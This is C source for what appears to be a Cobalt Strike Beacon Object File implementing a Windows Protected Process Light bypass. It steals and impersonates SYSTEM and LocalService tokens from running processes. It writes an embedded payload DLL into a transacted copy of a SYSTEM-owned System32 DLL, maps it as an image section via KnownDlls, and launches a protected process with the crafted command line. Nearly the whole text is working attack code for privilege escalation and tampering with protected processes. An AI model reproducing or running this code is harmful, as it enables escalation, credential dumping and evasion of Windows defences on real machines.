    *phToken = hToken;
    bReturnValue = TRUE;

    end:
        if (hCurrentProcessToken) {
            NtClose(hCurrentProcessToken);
        }

        return bReturnValue;
}


BOOL FindProcessTokenAndDuplicate(IN LPCWSTR pwszTargetSid, OUT PHANDLE phToken, __in_opt LPCWSTR pwszPrivileges[], IN DWORD dwPrivilegeCount) {
	BOOL bReturnValue = FALSE;

	PSID pTargetSid = NULL;
	PVOID pBuffer = NULL;
	PSYSTEM_PROCESS_INFORMATION pProcInfo = NULL;
	HANDLE hProcess = NULL, hToken = NULL, hTokenDup = NULL;
	DWORD dwReturnedLen = 0, dwBufSize = 0x1000, dwSessionId = 0;
	PSID pSidTmp = NULL;
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;

	LPWSTR pwszUsername = NULL;

	if (!sFunctionPointerStruct.StructConvertStringSidToSidW(pwszTargetSid, &pTargetSid))
		goto end;

	while (TRUE)
	{
		pBuffer = sFunctionPointerStruct.StructLocalAlloc(LPTR, dwBufSize);
		if (!pBuffer || status != STATUS_INFO_LENGTH_MISMATCH)
			break;

		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemProcessInformation, pBuffer, dwBufSize, &dwReturnedLen);
		if (NT_SUCCESS(status))
		{
			pProcInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
			while (TRUE) {
				if (hProcess = sFunctionPointerStruct.StructOpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PtrToUlong(pProcInfo->UniqueProcessId)))
				{
					if (sFunctionPointerStruct.StructOpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken))
					{
						if (sFunctionPointerStruct.StructDuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hTokenDup))
						{
							if (TokenGetSid(hTokenDup, &pSidTmp) && TokenGetUsername(hTokenDup, &pwszUsername))
							{
								if (TokenCompareSids(pSidTmp, pTargetSid))
								{
									BeaconPrintf(CALLBACK_OUTPUT, "Found potential candidate!\n");

									BOOL bTokenIsNotRestricted = FALSE;
									TokenIsNotRestricted(hTokenDup, &bTokenIsNotRestricted);

									if (bTokenIsNotRestricted)
										BeaconPrintf(CALLBACK_OUTPUT, "This token is not restricted.\n");
									else
										BeaconPrintf(CALLBACK_OUTPUT, "This token is restricted.\n");

									if (bTokenIsNotRestricted)
									{
										if (pwszPrivileges && dwPrivilegeCount != 0)
										{
											DWORD dwPrivilegeFound = 0;
											for (DWORD i = 0; i < dwPrivilegeCount; i++)
											{
												if (TokenCheckPrivilege(hTokenDup, pwszPrivileges[i], FALSE))
													dwPrivilegeFound++;
											}

											BeaconPrintf(CALLBACK_OUTPUT, "Found %d/%d required privileges in token.\n", dwPrivilegeFound, dwPrivilegeCount);

											if (dwPrivilegeFound == dwPrivilegeCount)
											{
												BeaconPrintf(CALLBACK_OUTPUT, "Found a valid token candidate.\n");

												*phToken = hTokenDup;
												bReturnValue = TRUE;
											}
										}
										else
										{
											BeaconPrintf(CALLBACK_OUTPUT,"Found a valid Token.\n");

											*phToken = hTokenDup;
											bReturnValue = TRUE;
										}
									}
								}
								sFunctionPointerStruct.StructLocalFree(pSidTmp);
								sFunctionPointerStruct.StructLocalFree(pwszUsername);
							}
							if (!bReturnValue)
								NtClose(hTokenDup);
						}
						NtClose(hToken);
					}
					NtClose(hProcess);
				}

				if (bReturnValue)
					break;

				if (!pProcInfo->NextEntryOffset)
					break;

				pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
			}
		}

		sFunctionPointerStruct.StructLocalFree(pBuffer);
		dwBufSize <<= 1;
	}

    end:
	    if (pTargetSid)
		    sFunctionPointerStruct.StructLocalFree(pTargetSid);

	    return bReturnValue;
}


BOOL Impersonate(IN HANDLE hToken) {
    HANDLE hThread = sFunctionPointerStruct.StructGetCurrentThread();

    if ( !sFunctionPointerStruct.StructSetThreadToken(&hThread, hToken) ) {
        BeaconPrintf(CALLBACK_ERROR, "Error in setting current thread token in Impersonate (exploit.h).\n");
        return FALSE;
    }

    return TRUE;
}


BOOL ImpersonateLocalService(_Out_ PHANDLE phLocalServiceToken) {
    return ImpersonateUser(L"S-1-5-19", phLocalServiceToken, NULL, 0);
}


BOOL CheckKnownDllSymbolicLink(IN LPCWSTR pwszDllName, IN LPWSTR pwszTarget) {
    BOOL bReturnValue = FALSE;
    NTSTATUS status = 0;
    LPWSTR pwszLinkName = NULL;
    OBJECT_ATTRIBUTES oa = { 0 };
    UNICODE_STRING name = { 0 };
    UNICODE_STRING target = { 0 };
    LPWSTR pwszTargetLocal = NULL;
    HANDLE hLink = NULL;
    ULONG length = 0;

    pwszLinkName = (LPWSTR)sFunctionPointerStruct.StructLocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    if ( !pwszLinkName ) {
        goto end;
    }

    pwszTargetLocal = (LPWSTR)sFunctionPointerStruct.StructLocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    if ( !pwszTargetLocal ) {
        goto end;
    }

    WCHAR wcKnownDLLs[] = L"\\KnownDlls\\";

    MSVCRT$wcsncpy(pwszLinkName, wcKnownDLLs, sFunctionPointerStruct.StructlstrlenW(wcKnownDLLs));
    MSVCRT$wcsncat(pwszLinkName, pwszDllName, sFunctionPointerStruct.StructlstrlenW(pwszDllName));

    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)(sFunctionPointerStruct.StructGetProcAddress(sFunctionPointerStruct.StructGetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString"));
    RtlInitUnicodeString(&name, pwszLinkName);
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenSymbolicLinkObject(&hLink, SYMBOLIC_LINK_QUERY, &oa);

    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Error in calling NtOpenSymbolicLink: %ls. Exiting.\n", (wchar_t*)pwszLinkName);
        goto end;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Symbolic link was successfully opened.\n");
    }

    target.Buffer = pwszTargetLocal;
    target.Length = 0;
    target.MaximumLength = MAX_PATH * sizeof(WCHAR);

    status = NtQuerySymbolicLinkObject(hLink, &target, &length);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Error in calling NtQuerySymbolicLinkObject inside CheckKnownDllSymbolicLink: %ls. Exiting.\n", (wchar_t*)pwszLinkName);
        goto end;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully queried symbolic link object.\n");
    }

    bReturnValue = MSVCRT$_wcsicmp(target.Buffer, pwszTarget) == 0;

    end:
        if (pwszLinkName) {
            sFunctionPointerStruct.StructLocalFree(pwszLinkName);
        }

        if (pwszTargetLocal) {
            sFunctionPointerStruct.StructLocalFree(pwszTargetLocal);
        }

        if (hLink) {
            NtClose(hLink);
        }

        return bReturnValue;
}


BOOL MapDll(IN LPWSTR pwszSectionName, OUT PHANDLE phSection) {
    BOOL bReturnValue = FALSE;
    OBJECT_ATTRIBUTES oa = { 0 };
    UNICODE_STRING sectionName = { 0 };
    NTSTATUS status = 0;
    HANDLE hSection = NULL;

    HANDLE hDllTransacted = NULL;

    if ( !WritePayloadDllTransacted(&hDllTransacted) ) {
        goto end;
    }

    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)(sFunctionPointerStruct.StructGetProcAddress(sFunctionPointerStruct.StructGetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString"));
    RtlInitUnicodeString(&sectionName, pwszSectionName);
    InitializeObjectAttributes(&oa, &sectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &oa, NULL, PAGE_READONLY, SEC_IMAGE, hDllTransacted);
    if (status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Unsuccessful NtCreateSection call. Exiting.\n");
        goto end;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Successful NtCreateSection call. ;)\n");

    *phSection = hSection;
    bReturnValue = TRUE;


    end:
        if (hDllTransacted) {
            NtClose(hDllTransacted);
        }

        return bReturnValue;
}


BOOL UnmapDll(IN HANDLE hSection) {
    NTSTATUS status = 0;

    status = NtClose(hSection);
    if (status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Error in closing handle within UnmapDll.\n");
        return FALSE;
    }

    return TRUE;
}


BOOL WritePayloadDllTransacted(OUT PHANDLE pdhFile) {
    BOOL bReturnValue = FALSE;

    HRSRC hResource = NULL;
    HGLOBAL hResourceData = NULL;
    DWORD dwResourceSize = 0;
    LPVOID lpData = NULL;

    LPWSTR pwszTargetFile = NULL;
    NTSTATUS status = 0;
    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
    HANDLE hTransaction = NULL;
    HANDLE hTransactedFile = NULL;

    DWORD dwBytesWritten = 0;
    DWORD currentSize = sizeof(fileArray);

    BeaconPrintf(CALLBACK_OUTPUT, "Seeking appropriate file candidate of size: %ld\n", currentSize);

    if ( !FindFileForTransaction(currentSize, &pwszTargetFile) ) {
        BeaconPrintf(CALLBACK_ERROR, "Unable to find an appropriate file candidate. Exiting.\n");
        return FALSE;
    }

     BeaconPrintf(CALLBACK_OUTPUT, "Found appropriate file candidate: %ls\n", (wchar_t*)pwszTargetFile);

     status = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &oa, NULL, NULL, 0, 0, 0, NULL, NULL);
     if (status != 0) {
         BeaconPrintf(CALLBACK_ERROR, "Unable to create NT transaction. Exiting.\n");
         goto end;
     } else {
         BeaconPrintf(CALLBACK_OUTPUT, "Successfully created NT transaction.\n");
     }

     hTransactedFile = sFunctionPointerStruct.StructCreateFileTransactedW(pwszTargetFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);

     if ( hTransactedFile == INVALID_HANDLE_VALUE ) {
         BeaconPrintf(CALLBACK_ERROR, "Error in CreateFileTransactedW. Exiting.\n");
         goto end;
     }

     BeaconPrintf(CALLBACK_OUTPUT, "Successful return from CreateFileTransacted with file: %ls\n", pwszTargetFile);

     if ( !sFunctionPointerStruct.StructWriteFile(hTransactedFile, fileArray, currentSize, &dwBytesWritten, NULL) ) {
         BeaconPrintf(CALLBACK_ERROR, "Error in writing data to transacted file from WriteFile. Exiting.\n");
         goto end;
     }

     BeaconPrintf(CALLBACK_OUTPUT, "Successfully wrote %d bytes of supplied DLL to transacted file: %ls\n", dwBytesWritten, (wchar_t*)pwszTargetFile);

     *pdhFile = hTransactedFile;
     bReturnValue = TRUE;


     end:
        if (pwszTargetFile) {
            sFunctionPointerStruct.StructLocalFree(pwszTargetFile);
        }

        return bReturnValue;
}


BOOL FindFileForTransaction(IN DWORD dwMinSize, OUT LPWSTR* ppwszFilePath) {
    BOOL bReturnValue = FALSE;
    WCHAR wszSearchPath[MAX_PATH] = { 0 };
    WCHAR wszFilePath[MAX_PATH] = { 0 };
    WIN32_FIND_DATAW wfd = { 0 };
    HANDLE hFind = NULL;
    HANDLE hFile = NULL;
    PSID pSidOwner = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;
    DWORD dwFileSize = 0;
    PSID pSidTarget = NULL;

    // Silly initialization
    WCHAR wcDllExtension[] = L"\\*.dll";
    WCHAR wcBackSlash[] = L"\\";
    
    sFunctionPointerStruct.StructConvertStringSidToSidW(L"S-1-5-18", &pSidTarget);                         
      
    sFunctionPointerStruct.StructGetSystemDirectoryW(wszSearchPath, MAX_PATH);                               // C:\Windows\System32
    MSVCRT$wcsncat(wszSearchPath, wcDllExtension, sFunctionPointerStruct.StructlstrlenW(wcDllExtension));    // C:\Windows\System32\*.dll

    // Debugging
    BeaconPrintf(CALLBACK_OUTPUT, "Should be C:\\Windows\\System32\\*.dll:    %ls\n", (wchar_t*)wszSearchPath);

    hFind = sFunctionPointerStruct.StructFindFirstFileW(wszSearchPath, &wfd);
    if ( hFind != INVALID_HANDLE_VALUE ) {
        do {
            sFunctionPointerStruct.StructGetSystemDirectoryW(wszFilePath, MAX_PATH);
            MSVCRT$wcsncat(wszFilePath, wcBackSlash, sFunctionPointerStruct.StructlstrlenW(wcBackSlash));
            MSVCRT$wcsncat(wszFilePath, wfd.cFileName, sFunctionPointerStruct.StructlstrlenW(wfd.cFileName));

            BeaconPrintf(CALLBACK_OUTPUT, "Filepath: %ls\n", (wchar_t*)wszFilePath);

            hFile = sFunctionPointerStruct.StructCreateFileW(wszFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile) {
                dwFileSize = sFunctionPointerStruct.StructGetFileSize(hFile, NULL);
                if ( (dwFileSize != INVALID_FILE_SIZE) && (dwFileSize > dwMinSize) ) {
                    if ( sFunctionPointerStruct.StructGetSecurityInfo(hFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, &pSidOwner, NULL, NULL, NULL, &pSD) == ERROR_SUCCESS ) {
                        if ( TokenCompareSids(pSidOwner, pSidTarget) ) {
                            *ppwszFilePath = (LPWSTR)sFunctionPointerStruct.StructLocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
                            if (*ppwszFilePath) {
                                MSVCRT$wcsncpy(*ppwszFilePath, wszFilePath, sFunctionPointerStruct.StructlstrlenW(wszFilePath));
                                BeaconPrintf(CALLBACK_OUTPUT, "File path: %ls\n", (wchar_t*)wszFilePath);
                                bReturnValue = TRUE;
                            }
                        }
                    }
                }
                NtClose(hFile);
            }
        } while ( sFunctionPointerStruct.StructFindNextFileW(hFind, &wfd) && !bReturnValue );

        sFunctionPointerStruct.StructFindClose(hFind);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Broke on HFIND.\n");
    }

    return bReturnValue;
}


BOOL PrepareCommandLine(IN DWORD dwProcessId, IN LPWSTR pwszFilePath, IN LPWSTR pwszRandomGuid, OUT LPWSTR* ppwszCommandLine) {
    BOOL bReturnValue = FALSE;
    const size_t size = 32767;
    LPWSTR pwszSystemDirectory = NULL;

    *ppwszCommandLine = (LPWSTR)sFunctionPointerStruct.StructLocalAlloc(LPTR, size * sizeof(WCHAR));
    if ( !*ppwszCommandLine ) {
        BeaconPrintf(CALLBACK_OUTPUT, "Error heap allocation for ppwszCommandLine.\n");
        goto end;
    }

    pwszSystemDirectory = (LPWSTR)sFunctionPointerStruct.StructLocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    if ( !pwszSystemDirectory ) {
        BeaconPrintf(CALLBACK_OUTPUT, "Error heap allocation for pwszSystemDirectory.\n");
        goto end;
    }

    sFunctionPointerStruct.StructGetSystemDirectoryW(pwszSystemDirectory, MAX_PATH);
    BeaconPrintf(CALLBACK_OUTPUT, "System directory: %ls\n", (wchar_t*)pwszSystemDirectory);
    
    MSVCRT$wcsncpy(*ppwszCommandLine, pwszSystemDirectory, sFunctionPointerStruct.StructlstrlenW(pwszSystemDirectory));
    MSVCRT$wcsncat(*ppwszCommandLine, L"\\", sFunctionPointerStruct.StructlstrlenW(L"\\"));
    MSVCRT$wcsncat(*ppwszCommandLine, PPL_BINARY, sFunctionPointerStruct.StructlstrlenW(PPL_BINARY));
    MSVCRT$wcsncat(*ppwszCommandLine, L" ", sFunctionPointerStruct.StructlstrlenW(L" "));
    MSVCRT$wcsncat(*ppwszCommandLine, wcPID, sFunctionPointerStruct.StructlstrlenW(wcPID));
    MSVCRT$wcsncat(*ppwszCommandLine, L" ", sFunctionPointerStruct.StructlstrlenW(L" "));
    MSVCRT$wcsncat(*ppwszCommandLine, L"\"", sFunctionPointerStruct.StructlstrlenW(L"\""));
    MSVCRT$wcsncat(*ppwszCommandLine, pwszFilePath, sFunctionPointerStruct.StructlstrlenW(pwszFilePath));
    MSVCRT$wcsncat(*ppwszCommandLine, L"\" ", sFunctionPointerStruct.StructlstrlenW(L"\" "));
    MSVCRT$wcsncat(*ppwszCommandLine, pwszRandomGuid, sFunctionPointerStruct.StructlstrlenW(pwszRandomGuid));

    
    if (gDebug) {
        WCHAR wcDebugFlag[] = L" -d";
        MSVCRT$wcsncat(*ppwszCommandLine, wcDebugFlag, sFunctionPointerStruct.StructlstrlenW(wcDebugFlag));
    } else {
        if (gVerbose) {
            WCHAR wcVerboseFlag[] = L" -v";
            MSVCRT$wcsncat(*ppwszCommandLine, wcVerboseFlag, sFunctionPointerStruct.StructlstrlenW(wcVerboseFlag));
        }
    }
    

    BeaconPrintf(CALLBACK_OUTPUT, "Current generated command line: %ls\n", (wchar_t*)(*ppwszCommandLine));

    bReturnValue = TRUE;

    end:
        if (pwszSystemDirectory) {
            sFunctionPointerStruct.StructLocalFree(pwszSystemDirectory);
        }

        return bReturnValue;
}


BOOL CreateProtectedProcessAsUser(IN HANDLE hToken, IN LPWSTR pwszCommandLine, OUT PHANDLE phProcess) {
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    HANDLE hProcess = NULL;

    MSVCRT$memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    if ( !sFunctionPointerStruct.StructCreateProcessAsUserW(hToken, NULL, pwszCommandLine, NULL, NULL, TRUE, CREATE_PROTECTED_PROCESS, NULL, NULL, &si, &pi) ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create process as user. Exiting.\n");
        return FALSE;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfuly created process as user.\n");
    }

    *phProcess = pi.hProcess;
    NtClose(pi.hThread);

    return TRUE;
}